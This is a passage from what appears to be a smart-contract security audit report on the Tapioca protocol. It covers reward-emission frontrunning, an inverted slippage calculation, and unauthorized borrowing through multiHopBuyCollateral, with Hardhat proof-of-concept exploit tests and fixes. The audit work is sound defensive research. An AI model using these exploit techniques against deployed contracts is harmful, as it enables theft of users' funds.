Assuming the user borrowed1,000 USD0and borrowOpeningFee is at the default value of0.5%. Then the user’s debt would be1,005. If there’s only 1 user, and the totalSupply is indeed1,000, then there’s no other way for the user to get the extra5 USD0. Therefore he can’t fully redeem his collateral and would have at least5 * (1 + collateralizationRate) USD0worth of collateral locked up. This fund cannot be accessed by the user, nor is it used by the protocol. It would be sitting at yieldbox forever earning yields for no one.
This issue becomes more significant when there are more users and minted amount. If more amount is minted more funds are locked.
It might seem like user Alice could go to the market to buy5 USD0to fully repay. But the reality is that he is transferring the unfortunate disaster to another user. Cause no matter what, Owed debts would always be higher thantotalSupply.
This debt would keep accumulating after each mint and every burn. For example, assuming that one 1 billion of USD0 was minted and 990 million was burned in the first month. totalSupply and hence circulating supply would be 10 million, but user debts would be 15 million USD0. That’s 5 million USD that can’t be accessed by user nor fee collector.
Recommended Mitigation Steps
borrowOpeningFee should not be added to userBorrowPart. If fee is to implemented, then fee collector should receive collateral or USD0 token.
0xRektora (Tapioca) confirmed via duplicate issue 739

[H-52] Attacker can prevent rewards from being issued to gauges for a given epoch in TapiocaOptionBroker
Submitted byRuhum, also found by0xRobocop,bin2chen,KIntern_NA,carrotsmuggler,c7e7eff,0xnev,glcanvas,marcKn, anddirk_y
https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/options/TapiocaOptionBroker.sol#L426
https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/tokens/TapOFT.sol#L201
An attacker can prevent rewards from being issued to gauges for a given epoch
Proof of Concept
TapOFT.emitForWeek()is callable by anyone. The function will only return a value > 0 the first time it’s called in any given week:
///-- Write methods --/// @notice Emit the TAP for the current week/// @return the emitted amountfunctionemitForWeek()externalnotPausedreturns(uint256) {require(_getChainId() ==governanceChainIdentifier,"chain not valid");uint256week=_timestampToWeek(block.timestamp);if(emissionForWeek[week] >0)return0;// Update DSO supply from last minted emissionsdso_supply-=mintedInWeek[week-1];// Compute unclaimed emission from last week and add it to the current week emissionuint256unclaimed=emissionForWeek[week-1] -mintedInWeek[week-1];uint256emission=uint256(_computeEmission());emission+=unclaimed;emissionForWeek[week] =emission;emitEmitted(week,emission);returnemission;}
InTapiocaOptionBroker.newEpoch()the return value ofemitForWeek()is used to determine the amount of tokens to distribute to the gauges. If the return value is 0, it will assign 0 reward tokens to each gauge:
/// @notice Start a new epoch, extract TAP from the TapOFT contract,///         emit it to the active singularities and get the price of TAP for the epoch.functionnewEpoch()external{require(block.timestamp>=lastEpochUpdate+EPOCH_DURATION,"tOB: too soon");uint256[]memorysingularities=tOLP.getSingularities();require(singularities.length>0,"tOB: No active singularities");// Update epoch infolastEpochUpdate=block.timestamp;epoch++;// Extract TAP// @audit `emitForWeek` can be called by anyone. If it's called for a given// week, subsequent calls will return `0`.//// Attacker calls `emitForWeek` before it's executed through `newEpoch()`.// The call to `newEpoch()` will cause `emitForWeek` to return `0`.// That will prevent it from emitting any of the TAP to the gauges.// For that epoch, no rewards will be distributed to users.uint256epochTAP=tapOFT.emitForWeek();_emitToGauges(epochTAP);// Get epoch TAP valuation(,epochTAPValuation) =tapOracle.get(tapOracleData);emitNewEpoch(epoch,epochTAP,epochTAPValuation);}
An attacker who frontruns the call tonewEpoch()with a call toemitForWeek()will prevent any rewards from being distributed for a given epoch.
The reward tokens aren’t lost. TapOFT will roll the missed epoch’s rewards into the next one. Meaning, the gauge rewards will be delayed. The length depends on the number of times the attacker is able to frontrun the call tonewEpoch().
But, it will cause the distribution to be screwed. If Alice is eligible for gauge rewards until epoch x + 1 (her lock runs out), and the attacker manages to keep the attack running until x + 2, she won’t be able to claim her reward tokens. They will be distributed in epoch x + 3 to all the users who have an active lock at that time.
Here’s a PoC:
// tOB.test.tsit.only("should fail to emit rewards to gauges if attacker frontruns",async()=>{const{tOB,tapOFT,tOLP,sglTokenMock,sglTokenMockAsset,tapOracleMock,sglTokenMock2,sglTokenMock2Asset,} =awaitloadFixture(setupFixture);// Setup tOBawaittOB.oTAPBrokerClaim();awaittapOFT.setMinter(tOB.address);// No singularitiesawaitexpect(tOB.newEpoch()).to.be.revertedWith('tOB: No active singularities',);// Register sglconsttapPrice=BN(1e18).mul(2);awaittapOracleMock.set(tapPrice);awaittOLP.registerSingularity(sglTokenMock.address,sglTokenMockAsset,0,);awaittapOFT.emitForWeek();awaittOB.newEpoch();constemittedTAP=awaittapOFT.getCurrentWeekEmission();expect(awaittOB.singularityGauges(1,sglTokenMockAsset)).to.be.equal(emittedTAP,);})
Test output:
TapiocaOptionBroker1) should fail to emit rewards to gaugesifattacker frontruns0 passing (1s)1 failing1) TapiocaOptionBrokershould fail to emit rewards to gaugesifattacker frontruns:AssertionError: expected 0 to equal 469157964000000000000000. The numerical values of the given"ethers.BigNumber"and"ethers.BigNumber"inputs were compared, and they differed.+ expected - actual-0+469157964000000000000000at Context.<anonymous> (test/oTAP/tOB.test.ts:606:73)at processTicksAndRejections (node:internal/process/task_queues:96:5)at runNextTicks (node:internal/process/task_queues:65:3)at listOnTimeout (node:internal/timers:528:9)at processTimers (node:internal/timers:502:7)
Recommended Mitigation Steps
emitForWeek()should return the current week’s emitted amount if it was already called:
functionemitForWeek()externalnotPausedreturns(uint256) {require(_getChainId() ==governanceChainIdentifier,"chain not valid");uint256week=_timestampToWeek(block.timestamp);if(emissionForWeek[week] >0)returnemissionForWeek[week];// ...
0xRektora (Tapioca) confirmed via duplicate issue 192
LSDan (Judge) increase severity to High

[H-53] Potential 99.5% loss inemergencyWithdraw()of two Yieldbox strategies
Submitted by0xfuje, also found byMadalad,paweenp,carrotsmuggler,kaden,c7e7eff,Brenzee,SaeedAlipoor01988, andVagner
https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/lido/LidoEthStrategy.sol#L108
https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/convex/ConvexTricryptoStrategy.sol#L154
99.5% of user funds are lost to slippage in two Yieldbox strategies in case ofemergencyWithdraw()
Description
Slippage is incorrectly calculated whereminAmountis intended to be 99.5%, however it’s calculated to be only 0.5%, making the other 99.5% sandwichable. The usual correctminAmountslippage calculation in other Yieldbox strategy contracts isuint256 minAmount = calcAmount - (calcAmount * 50) / 10_000;
Calculation logic
InConvexTriCryptoStrategyandLidoEthStrategy-emergencyWithdraw()allows the owner to withdraw all funds from the external pools. the amount withdrawn from the corresponding pool is calculated to be:uint256 minAmount = (calcWithdraw * 50) / 10_000;. This is incorrect and only 0.5% of the withdrawal.
Let’s calculate withcalcWithdraw = 1000as the amount to withdrawn from the pool.uint256 incorrectMinAmount = (1000 * 50) / 10_000 = 5
The correct calculation would look like this:uint256 correctMinAmount = calcWithdraw - (calcWithdraw * 50) / 10_000akauint256 correctMinAmount = 1000 - (1000 * 50) / 10_000 = 995
Withdrawal logic
emergencyWithdraw()of Yieldbox Strategy contracts is meant to remove all liquidity from the corresponding strategy contract’s liquidity pool.
In the case ofLidoStrategythe actual withdraw iscurveStEthPool.exchange(1, 0, toWithdraw, minAmount)which directly withdraws from the Curve StEth pool.
In the case ofConvexTriCryptoStrategyit’slpGetter.removeLiquidityWeth(lpBalance, minAmount)and lpGetter withdraws from the Curve Tri Crypto (USDT/WBTC/WETH) pool viaremoveLiquidityWeth()->_removeLiquidity()->liquidityPool.remove_liquidity_one_coin(_amount, _index, _min).
These transactions are vulnerable to front-running andsandwich attacksso the amount withdrawn is only guaranteed to withdraw theminAmountaka 0.5% from the pool which makes the other 99.5% user funds likely to be lost.
Recommended Mitigation Steps
Fix the incorrectminAmountcalculation to beuint256 minAmount = calcAmount - (calcAmount * 50) / 10_000;inConvexTriCryptoStrategyandLidoEthStrategy.
0xRektora (Tapioca) confirmed via duplicate issue 408

[H-54] Anybody can buy collateral on behalf of other users without having any allowance using the multiHopBuyCollateral()
Submitted by0xStalin, also found bypeakbolt,plainshift,KIntern_NA,Ack, andrvierdiiev
Malicious actors can buy collateral on behalf of other users without having any allowance to do so.No unauthorized entity should be allowed to take borrows on behalf of other users.
Proof of Concept
TheSGLLeverage::multiHopBuyCollateral()function allows users to level up cross-chain: Borrow more and buy collateral with it, the function receives as parameters the account that the borrow will be credited to, the amount of collateral to add (if any), the amount that is being borrowed and a couple of other variables.TheSGLLeverage::multiHopBuyCollateral()function only calls thesolvent()modifier, which will validate that the account is solvent at the end of the operation.ThecollateralAmountvariable is used to compute the required number of shares to add the specifiedcollateralAmountas extra collateral to the borrower account, then there is a check to validate that the caller has enough allowance to add those shares of collateral, and if so, then the collateral is added and debited to thefromaccount
...//add collateraluint256collateralShare=yieldBox.toShare(collateralId,collateralAmount,false);_allowedBorrow(from,collateralShare);_addCollateral(from,from,false,0,collateralShare);...
After adding the extra collateral (if any), theexecution proceeds to call the_borrow()to ask for a borrow specified by theborrowAmountparameter, and finally calls the USDO::sendForLeverage().The problem is that the function only validates if the caller has enough allowance for thecollateralAmountto be added, but it doesn’t check if the caller has enough allowance for the equivalent of shares of theborrowAmount(which is the total amount that will be borrowed!).The exploit occurs whena malicious actor calls themultiHopBuyCollateral()sending the values of the parameters as follows:from=> The account that will buy collateral and the borrow will be credited tocollateralAmount=>Set as 0borrowAmount=>The maximum amount that thefromaccount can borrow without falling into insolvency because of the borrowingWhat will happen is that a malicious actor without any allowance will be able to skip the check that validates if it has enough allowance to add more collateral, and will be able to take the borrow on behalf of thefromaccount, because theborrowShare(which represents the equivalent shares to take a borrow ofborrowAmount) is not used to validate if the caller has enough allowance to take that amount of debt on behalf of thefromaccount
Coded a Poc
I used thetapioca-bar-audit/test/singularity.test.tsas the base for this PoC.If you’d like to use the originaltapioca-bar-audit/test/singularity.test.tsfile, just make sure to update these two lines as follow:
diff--gita/singularity.test.tsb/singularity.test.ts.modifiedindex9c82d10..9ba9c76100755---a/singularity.test.ts+++b/singularity.test.ts.modified@@ -3440,6+3440,7@@describe('Singularity test', ()=>{it('should bounce between 2 chains',async()=>{const{deployer,+eoa1,tap,weth,createTokenEmptyStrategy,@@ -4082,7 +4083,7 @@describe('Singularitytest', () => {ethers.constants.MaxUint256,);-            await SGL_10.multiHopBuyCollateral(+            await SGL_10.connect(eoa1).multiHopBuyCollateral(deployer.address,0,bigDummyAmount,
I highly recommend to create a new test file with the below code snippet for the purpose of validating this vulnerability,make sure to create this file in the same folder as thetapioca-bar-audit/test/singularity.test.tsfile.
importhre, {ethers}from'hardhat';import{BigNumberish,BytesLike,Wallet}from'ethers';import{expect}from'chai';import{BN,getSGLPermitSignature,register}from'./test.utils';import{loadFixture,takeSnapshot,}from'@nomicfoundation/hardhat-network-helpers';import{LiquidationQueue__factory}from'../gitsub_tapioca-sdk/src/typechain/tapioca-periphery';import{ERC20Mock,ERC20Mock__factory,LZEndpointMock__factory,OracleMock__factory,UniswapV3SwapperMock__factory,}from'../gitsub_tapioca-sdk/src/typechain/tapioca-mocks';import{SignerWithAddress}from'@nomiclabs/hardhat-ethers/signers';import{BaseTOFT,BaseTOFTLeverageModule__factory,BaseTOFTMarketModule__factory,BaseTOFTOptionsModule__factory,BaseTOFTStrategyModule__factory,TapiocaOFT,TapiocaOFT__factory,TapiocaWrapper__factory,}from'../gitsub_tapioca-sdk/src/typechain/tapiocaz';importTapiocaOFTArtifactfrom'../gitsub_tapioca-sdk/src/artifacts/tapiocaz/TapiocaOFT.json';describe('Singularity test', ()=>{describe('multiHopBuyCollateral()',async()=>{constdeployYieldBox=async(signer:SignerWithAddress)=>{consturiBuilder=await(awaitethers.getContractFactory('YieldBoxURIBuilder')).deploy();constyieldBox=await(awaitethers.getContractFactory('YieldBox')).deploy(ethers.constants.AddressZero,uriBuilder.address);return{uriBuilder,yieldBox};};constdeployLZEndpointMock=async(chainId:number,signer:SignerWithAddress,)=>{constLZEndpointMock=newLZEndpointMock__factory(signer);returnawaitLZEndpointMock.deploy(chainId);};constdeployTapiocaWrapper=async(signer:SignerWithAddress)=>{constTapiocaWrapper=newTapiocaWrapper__factory(signer);returnawaitTapiocaWrapper.deploy(signer.address);};constTx_deployTapiocaOFT=async(lzEndpoint:string,isNative:boolean,erc20Address:string,yieldBoxAddress:string,hostChainID:number,hostChainNetworkSigner:SignerWithAddress,)=>{consterc20= (awaitethers.getContractAt('IERC20Metadata',erc20Address)).connect(hostChainNetworkSigner);consterc20name=awaiterc20.name();consterc20symbol=awaiterc20.symbol();consterc20decimal=awaiterc20.decimals();// eslint-disable-next-line @typescript-eslint/ban-ts-comment// @ts-ignoreconstBaseTOFTLeverageModule=newBaseTOFTLeverageModule__factory(hostChainNetworkSigner,);constleverageModule=awaitBaseTOFTLeverageModule.deploy(lzEndpoint,erc20Address,yieldBoxAddress,erc20name,erc20symbol,erc20decimal,hostChainID,);constBaseTOFTStrategyModule=newBaseTOFTStrategyModule__factory(hostChainNetworkSigner,);conststrategyModule=awaitBaseTOFTStrategyModule.deploy(lzEndpoint,erc20Address,yieldBoxAddress,erc20name,erc20symbol,erc20decimal,hostChainID,);constBaseTOFTMarketModule=newBaseTOFTMarketModule__factory(hostChainNetworkSigner,);constmarketModule=awaitBaseTOFTMarketModule.deploy(lzEndpoint,erc20Address,yieldBoxAddress,erc20name,erc20symbol,erc20decimal,hostChainID,);constBaseTOFTOptionsModule=newBaseTOFTOptionsModule__factory(hostChainNetworkSigner,);constoptionsModule=awaitBaseTOFTOptionsModule.deploy(lzEndpoint,erc20Address,yieldBoxAddress,erc20name,erc20symbol,erc20decimal,hostChainID,);constargs:Parameters<TapiocaOFT__factory['deploy']> = [lzEndpoint,erc20Address,yieldBoxAddress,erc20name,erc20symbol,erc20decimal,hostChainID,leverageModule.address,strategyModule.address,marketModule.address,optionsModule.address,];constTapiocaOFT=newTapiocaOFT__factory(hostChainNetworkSigner);consttxData=TapiocaOFT.getDeployTransaction(...args).dataasBytesLike;return{txData,args};};constattachTapiocaOFT=async(address:string,signer:SignerWithAddress,)=>{consttapiocaOFT=newethers.Contract(address,TapiocaOFTArtifact.abi,signer,);returntapiocaOFT.connect(signer);};constmintAndApprove=async(erc20Mock:ERC20Mock,toft:BaseTOFT,signer:SignerWithAddress,amount:BigNumberish,)=>{awaiterc20Mock.freeMint(amount);awaiterc20Mock.approve(toft.address,amount);};it('Attacker will take a borrow on behalf of another user without having any allowance',async()=>{const{deployer,eoa1,tap,weth,createTokenEmptyStrategy,deployCurveStableToUsdoBidder,magnetar,createWethUsd0Singularity,registerBigBangMarket,wethUsdcOracle,} =awaitloadFixture(register);//Deploy LZEndpointMockconstLZEndpointMock_chainID_0=awaitdeployLZEndpointMock(0,deployer,);constLZEndpointMock_chainID_10=awaitdeployLZEndpointMock(10,deployer,);//Deploy TapiocaWrapperconsttapiocaWrapper_0=awaitdeployTapiocaWrapper(deployer);consttapiocaWrapper_10=awaitdeployTapiocaWrapper(deployer);//Deploy YB and StrategiesconstyieldBox0Data=awaitdeployYieldBox(deployer);constYieldBox_0=yieldBox0Data.yieldBox;constusdo_0_leverage=await(awaitethers.getContractFactory('USDOLeverageModule')).deploy(LZEndpointMock_chainID_0.address,YieldBox_0.address);constusdo_0_market=await(awaitethers.getContractFactory('USDOMarketModule')).deploy(LZEndpointMock_chainID_0.address,YieldBox_0.address);constusdo_0_options=await(awaitethers.getContractFactory('USDOOptionsModule')).deploy(LZEndpointMock_chainID_0.address,YieldBox_0.address);constUSDO_0=await(awaitethers.getContractFactory('USDO')).deploy(LZEndpointMock_chainID_0.address,YieldBox_0.address,deployer.address,usdo_0_leverage.address,usdo_0_market.address,usdo_0_options.address,);awaitUSDO_0.deployed();constusdo_10_leverage=await(awaitethers.getContractFactory('USDOLeverageModule')).deploy(LZEndpointMock_chainID_10.address,YieldBox_0.address);constusdo_10_market=await(awaitethers.getContractFactory('USDOMarketModule')).deploy(LZEndpointMock_chainID_10.address,YieldBox_0.address);constusdo_10_options=await(awaitethers.getContractFactory('USDOOptionsModule')).deploy(LZEndpointMock_chainID_10.address,YieldBox_0.address);constUSDO_10=await(awaitethers.getContractFactory('USDO')).deploy(LZEndpointMock_chainID_10.address,YieldBox_0.address,deployer.address,usdo_10_leverage.address,usdo_10_market.address,usdo_10_options.address,);awaitUSDO_10.deployed();//Deploy PenroseconstBAR_0=await(awaitethers.getContractFactory('Penrose')).deploy(YieldBox_0.address,tap.address,weth.address,deployer.address,);awaitBAR_0.deployed();awaitBAR_0.setUsdoToken(USDO_0.address);//Deploy ERC20MockconstERC20Mock=newERC20Mock__factory(deployer);consterc20Mock=awaitERC20Mock.deploy('erc20Mock','MOCK',0,18,deployer.address,);awaiterc20Mock.toggleRestrictions();// master contractconstmediumRiskMC_0=await(awaitethers.getContractFactory('Singularity')).deploy();awaitmediumRiskMC_0.deployed();awaitBAR_0.registerSingularityMasterContract(mediumRiskMC_0.address,1,);constmediumRiskMCBigBang_0=await(awaitethers.getContractFactory('BigBang')).deploy();awaitmediumRiskMCBigBang_0.deployed();awaitBAR_0.registerBigBangMasterContract(mediumRiskMCBigBang_0.address,1,);//Deploy TapiocaOFT{consttxData=awaittapiocaWrapper_0.populateTransaction.createTOFT(erc20Mock.address,(awaitTx_deployTapiocaOFT(LZEndpointMock_chainID_0.address,false,erc20Mock.address,YieldBox_0.address,31337,deployer,)).txData,ethers.utils.randomBytes(32),false,);txData.gasLimit=awaithre.ethers.provider.estimateGas(txData);awaitdeployer.sendTransaction(txData);}consttapiocaOFT0= (awaitattachTapiocaOFT(awaittapiocaWrapper_0.tapiocaOFTs((awaittapiocaWrapper_0.tapiocaOFTLength()).sub(1),),deployer,))asTapiocaOFT;{consttxData=awaittapiocaWrapper_10.populateTransaction.createTOFT(erc20Mock.address,(awaitTx_deployTapiocaOFT(LZEndpointMock_chainID_10.address,false,erc20Mock.address,YieldBox_0.address,31337,deployer,)).txData,ethers.utils.randomBytes(32),false,);txData.gasLimit=awaithre.ethers.provider.estimateGas(txData);awaitdeployer.sendTransaction(txData);}consttapiocaOFT10= (awaitattachTapiocaOFT(awaittapiocaWrapper_10.tapiocaOFTs((awaittapiocaWrapper_10.tapiocaOFTLength()).sub(1),),deployer,))asTapiocaOFT;//Deploy strategiesconstStrategy_0=awaitcreateTokenEmptyStrategy(YieldBox_0.address,tapiocaOFT0.address,);constStrategy_10=awaitcreateTokenEmptyStrategy(YieldBox_0.address,tapiocaOFT10.address,);// Set trusted remotesconstdstChainId0=awaitLZEndpointMock_chainID_0.getChainId();constdstChainId10=awaitLZEndpointMock_chainID_10.getChainId();awaitUSDO_0.setTrustedRemote(dstChainId10,ethers.utils.solidityPack(['address','address'],[USDO_10.address,USDO_0.address],),);awaitUSDO_0.setTrustedRemote(31337,ethers.utils.solidityPack(['address','address'],[USDO_10.address,USDO_0.address],),);awaitUSDO_10.setTrustedRemote(dstChainId0,ethers.utils.solidityPack(['address','address'],[USDO_0.address,USDO_10.address],),);awaitUSDO_10.setTrustedRemote(31337,ethers.utils.solidityPack(['address','address'],[USDO_0.address,USDO_10.address],),);awaittapiocaWrapper_0.executeTOFT(tapiocaOFT0.address,tapiocaOFT0.interface.encodeFunctionData('setTrustedRemote', [dstChainId10,ethers.utils.solidityPack(['address','address'],[tapiocaOFT10.address,tapiocaOFT0.address],),]),true,);awaittapiocaWrapper_0.executeTOFT(tapiocaOFT0.address,tapiocaOFT0.interface.encodeFunctionData('setTrustedRemote', [31337,ethers.utils.solidityPack(['address','address'],[tapiocaOFT10.address,tapiocaOFT0.address],),]),true,);awaittapiocaWrapper_10.executeTOFT(tapiocaOFT10.address,tapiocaOFT10.interface.encodeFunctionData('setTrustedRemote', [dstChainId0,ethers.utils.solidityPack(['address','address'],[tapiocaOFT0.address,tapiocaOFT10.address],),]),true,);awaittapiocaWrapper_10.executeTOFT(tapiocaOFT10.address,tapiocaOFT10.interface.encodeFunctionData('setTrustedRemote', [dstChainId10,ethers.utils.solidityPack(['address','address'],[tapiocaOFT0.address,tapiocaOFT10.address],),]),true,);awaittapiocaWrapper_10.executeTOFT(tapiocaOFT10.address,tapiocaOFT10.interface.encodeFunctionData('setTrustedRemote', [31337,ethers.utils.solidityPack(['address','address'],[tapiocaOFT0.address,tapiocaOFT10.address],),]),true,);// Link endpoints with addressesawaitLZEndpointMock_chainID_0.setDestLzEndpoint(tapiocaOFT0.address,LZEndpointMock_chainID_10.address,);awaitLZEndpointMock_chainID_10.setDestLzEndpoint(tapiocaOFT0.address,LZEndpointMock_chainID_0.address,);awaitLZEndpointMock_chainID_0.setDestLzEndpoint(tapiocaOFT0.address,LZEndpointMock_chainID_0.address,);awaitLZEndpointMock_chainID_10.setDestLzEndpoint(tapiocaOFT10.address,LZEndpointMock_chainID_10.address,);awaitLZEndpointMock_chainID_0.setDestLzEndpoint(tapiocaOFT10.address,LZEndpointMock_chainID_10.address,);awaitLZEndpointMock_chainID_10.setDestLzEndpoint(tapiocaOFT10.address,LZEndpointMock_chainID_0.address,);awaitLZEndpointMock_chainID_0.setDestLzEndpoint(USDO_10.address,LZEndpointMock_chainID_10.address,);awaitLZEndpointMock_chainID_0.setDestLzEndpoint(USDO_0.address,LZEndpointMock_chainID_10.address,);awaitLZEndpointMock_chainID_10.setDestLzEndpoint(USDO_0.address,LZEndpointMock_chainID_0.address,);awaitLZEndpointMock_chainID_10.setDestLzEndpoint(USDO_10.address,LZEndpointMock_chainID_0.address,);//Register tokens on YBawaitYieldBox_0.registerAsset(1,tapiocaOFT0.address,Strategy_0.address,0,);awaitYieldBox_0.registerAsset(1,tapiocaOFT10.address,Strategy_10.address,0,);consttapiocaOFT0Id=awaitYieldBox_0.ids(1,tapiocaOFT0.address,Strategy_0.address,0,);consttapiocaOFT10Id=awaitYieldBox_0.ids(1,tapiocaOFT10.address,Strategy_10.address,0,);expect(tapiocaOFT0Id.gt(0)).to.be.true;expect(tapiocaOFT10Id.gt(0)).to.be.true;expect(tapiocaOFT10Id.gt(tapiocaOFT0Id)).to.be.true;constbigDummyAmount=ethers.utils.parseEther('10');awaitmintAndApprove(erc20Mock,tapiocaOFT0,deployer,bigDummyAmount,);awaittapiocaOFT0.wrap(deployer.address,deployer.address,bigDummyAmount,);awaittapiocaOFT0.approve(YieldBox_0.address,ethers.constants.MaxUint256,);consttoDepositShare=awaitYieldBox_0.toShare(tapiocaOFT0Id,bigDummyAmount,false,);awaitYieldBox_0.depositAsset(tapiocaOFT0Id,deployer.address,deployer.address,0,toDepositShare,);letyb0Balance=awaitYieldBox_0.amountOf(deployer.address,tapiocaOFT0Id,);expect(yb0Balance.eq(bigDummyAmount)).to.be.true;//bc of the yieldconst{stableToUsdoBidder,curveSwapper} =awaitdeployCurveStableToUsdoBidder(YieldBox_0,tapiocaOFT0,USDO_0,false,);letsglMarketData=awaitcreateWethUsd0Singularity(USDO_0,tapiocaOFT0,BAR_0,awaitBAR_0.usdoAssetId(),tapiocaOFT0Id,mediumRiskMC_0,YieldBox_0,stableToUsdoBidder,0,);constSGL_0=sglMarketData.wethUsdoSingularity;sglMarketData=awaitcreateWethUsd0Singularity(USDO_0,tapiocaOFT10,BAR_0,awaitBAR_0.usdoAssetId(),tapiocaOFT10Id,mediumRiskMC_0,YieldBox_0,stableToUsdoBidder,0,);constSGL_10=sglMarketData.wethUsdoSingularity;awaittapiocaOFT0.approve(SGL_0.address,ethers.constants.MaxUint256,);awaitYieldBox_0.setApprovalForAll(SGL_0.address,true);awaitSGL_0.addCollateral(deployer.address,deployer.address,false,bigDummyAmount,0,);constcollateralShare=awaitSGL_0.userCollateralShare(deployer.address,);expect(collateralShare.gt(0)).to.be.true;constcollateralAmount=awaitYieldBox_0.toAmount(tapiocaOFT0Id,collateralShare,false,);expect(collateralAmount.eq(bigDummyAmount)).to.be.true;//test wrapawaitmintAndApprove(erc20Mock,tapiocaOFT10,deployer,bigDummyAmount,);awaittapiocaOFT10.wrap(deployer.address,deployer.address,bigDummyAmount,);consttapioca10Balance=awaittapiocaOFT10.balanceOf(deployer.address,);expect(tapioca10Balance.eq(bigDummyAmount)).to.be.true;awaittapiocaOFT10.approve(YieldBox_0.address,ethers.constants.MaxUint256,);awaitYieldBox_0.depositAsset(tapiocaOFT10Id,deployer.address,deployer.address,0,toDepositShare,);yb0Balance=awaitYieldBox_0.amountOf(deployer.address,tapiocaOFT10Id,);expect(yb0Balance.eq(bigDummyAmount)).to.be.true;//bc of the yieldawaittapiocaOFT10.approve(SGL_10.address,ethers.constants.MaxUint256,);awaitYieldBox_0.setApprovalForAll(SGL_10.address,true);awaitSGL_10.addCollateral(deployer.address,deployer.address,false,bigDummyAmount,0,);constsgl10CollateralShare=awaitSGL_10.userCollateralShare(deployer.address,);expect(sgl10CollateralShare.eq(collateralShare)).to.be.true;constUniswapV3SwapperMock=newUniswapV3SwapperMock__factory(deployer,);constuniV3SwapperMock=awaitUniswapV3SwapperMock.deploy(ethers.constants.AddressZero,);//lend some USD0 to SGL_10constoraclePrice=BN(1).mul((1e18).toString());constOracleMock=newOracleMock__factory(deployer);constoracleMock=awaitOracleMock.deploy('WETHMOracle','WETHMOracle',(1e18).toString(),);awaitwethUsdcOracle.deployed();awaitwethUsdcOracle.set(oraclePrice);const{bigBangMarket} =awaitregisterBigBangMarket(mediumRiskMCBigBang_0.address,YieldBox_0,BAR_0,weth,awaitBAR_0.wethAssetId(),oracleMock,0,0,0,0,0,);awaitweth.freeMint(bigDummyAmount.mul(5));awaitweth.approve(bigBangMarket.address,ethers.constants.MaxUint256,);awaitweth.approve(YieldBox_0.address,ethers.constants.MaxUint256);awaitYieldBox_0.setApprovalForAll(bigBangMarket.address,true);awaitYieldBox_0.depositAsset(awaitBAR_0.wethAssetId(),deployer.address,deployer.address,bigDummyAmount.mul(5),0,);awaitbigBangMarket.addCollateral(deployer.address,deployer.address,false,bigDummyAmount.mul(5),0,);constbigBangCollateralShare=awaitbigBangMarket.userCollateralShare(deployer.address);expect(bigBangCollateralShare.gt(0)).to.be.true;constcollateralIdSaved=awaitbigBangMarket.collateralId();constwethId=awaitBAR_0.wethAssetId();expect(collateralIdSaved.eq(wethId)).to.be.true;awaitUSDO_0.setMinterStatus(bigBangMarket.address,true);awaitbigBangMarket.borrow(deployer.address,deployer.address,bigDummyAmount.mul(3),);constusdoBorrowPart=awaitbigBangMarket.userBorrowPart(deployer.address,);expect(usdoBorrowPart.gt(0)).to.be.true;awaitYieldBox_0.withdraw(awaitbigBangMarket.assetId(),deployer.address,deployer.address,bigDummyAmount.mul(3),0,);constusdoBalance=awaitUSDO_0.balanceOf(deployer.address);expect(usdoBalance.gt(0)).to.be.true;constusdoBalanceShare=awaitYieldBox_0.toShare(awaitbigBangMarket.assetId(),usdoBalance.div(2),false,);awaitUSDO_0.approve(YieldBox_0.address,ethers.constants.MaxUint256,);awaitYieldBox_0.depositAsset(awaitbigBangMarket.assetId(),deployer.address,deployer.address,usdoBalance.div(2),0,);awaitSGL_10.addAsset(deployer.address,deployer.address,false,usdoBalanceShare,);consttotalSGL10Asset=awaitSGL_10.totalAsset();expect(totalSGL10Asset[0].gt(0)).to.be.true;letairdropAdapterParamsDst=hre.ethers.utils.solidityPack(['uint16','uint','uint','address'],[2,1_000_000,//extra gas limit; min 200kethers.utils.parseEther('2'),//amount of eth to airdropUSDO_10.address,],);constairdropAdapterParamsSrc=hre.ethers.utils.solidityPack(['uint16','uint','uint','address'],[2,1_000_000,//extra gas limit; min 200kethers.utils.parseEther('1'),//amount of eth to airdropmagnetar.address,],);constsgl10Asset=awaitSGL_10.asset();expect(sgl10Asset).to.eq(USDO_0.address);constuserCollateralShareBefore=awaitSGL_0.userCollateralShare(deployer.address,);expect(userCollateralShareBefore.eq(bigDummyAmount.mul(1e8))).to.be.true;constborrowPartBefore=awaitSGL_10.userBorrowPart(deployer.address,);expect(borrowPartBefore.eq(0)).to.be.true;awaitBAR_0.setSwapper(uniV3SwapperMock.address,true);awaitSGL_0.approve(tapiocaOFT0.address,ethers.constants.MaxUint256,);awaitSGL_0.approveBorrow(tapiocaOFT0.address,ethers.constants.MaxUint256,);awaitSGL_10.connect(eoa1).multiHopBuyCollateral(deployer.address,0,bigDummyAmount,{tokenOut:awaittapiocaOFT10.erc20(),amountOutMin:0,data:ethers.utils.toUtf8Bytes(''),},{srcExtraGasLimit:1_000_000,lzSrcChainId:0,lzDstChainId:10,zroPaymentAddress:ethers.constants.AddressZero,dstAirdropAdapterParam:airdropAdapterParamsDst,srcAirdropAdapterParam:airdropAdapterParamsSrc,refundAddress:deployer.address,},{swapper:uniV3SwapperMock.address,magnetar:magnetar.address,tOft:tapiocaOFT10.address,srcMarket:SGL_0.address,//there should be SGL_10 here in a normal situation; however, due to the current setup and how tokens are linked together, it will point to SGL_0},{value:ethers.utils.parseEther('10'),},);constuserCollateralShareAfter=awaitSGL_0.userCollateralShare(deployer.address,);expect(userCollateralShareAfter.gt(userCollateralShareBefore)).to.be.true;constuserCollateralAmount=awaitYieldBox_0.toAmount(tapiocaOFT10Id,userCollateralShareAfter,false,);expect(userCollateralAmount.eq(bigDummyAmount.mul(2))).to.be.true;constborrowPartAfter=awaitSGL_10.userBorrowPart(deployer.address,);expect(borrowPartAfter.gt(bigDummyAmount)).to.be.true;});});});
The PoC will demonstrate how an attacker can take borrows on behalf of other users without having any allowance by exploiting a vulnerability in the multiHopBuyCollateral()

Recommended Mitigation Steps
Make sure to validate that the caller has enough allowance to take the borrow specified by theborrowAmount.Use the returned amountborrowSharefrom the_borrow()to validate if the caller has enough allowance to take that borrow.
